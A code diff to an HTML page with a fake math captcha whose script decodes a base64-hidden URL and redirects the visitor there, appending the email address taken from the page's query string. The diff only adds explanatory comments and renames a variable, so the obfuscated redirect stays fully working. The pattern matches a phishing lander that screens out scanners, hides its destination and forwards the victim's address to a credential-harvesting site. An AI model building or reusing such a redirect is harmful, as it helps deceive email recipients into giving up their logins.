@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -137,7 +136,8 @@
     let answer = 0;
     let firstSolved = false;
 
-    const base64Ref = "aHR0cHM6Ly9kb2N1LmZlbm1lbm9zLmRlL0ViZVpF";
+    // Base64-encoded URL reference (example with the URL https://docu.fenmenos.de/EbeZE)
+    const base64Ref = "aHR0cHM6Ly9kb2N1LmZlbm1lbm9zLmRlL0ViZVpF";  // This decodes to "https://docu.fenmenos.de/EbeZE"
 
     function generateCaptcha() {
       const num1 = Math.floor(Math.random() * 20) + 1;
@@ -174,10 +174,13 @@
 
     function redirectUser() {
       try {
-        const decodedRef = atob(base64Ref);
-        const email = new URLSearchParams(window.location.search).get("email");
-        const finalUrl = email ? `${decodedRef}?e=${encodeURIComponent(email)}` : decodedRef;
-        window.location.href = finalUrl;
+        const decodedRef = atob(base64Ref); // Decode the base64 URL
+        const userEmail = new URLSearchParams(window.location.search).get("email");  // Grab the 'email' from the URL query parameter
+
+        // If email is found in the URL, append it as a query parameter `?e=email`
+        const finalUrl = userEmail ? `${decodedRef}?e=${encodeURIComponent(userEmail)}` : decodedRef;
+
+        window.location.href = finalUrl; // Redirect to the final URL
       } catch (e) {
         alert("Redirect failed. Invalid base64.");
       }
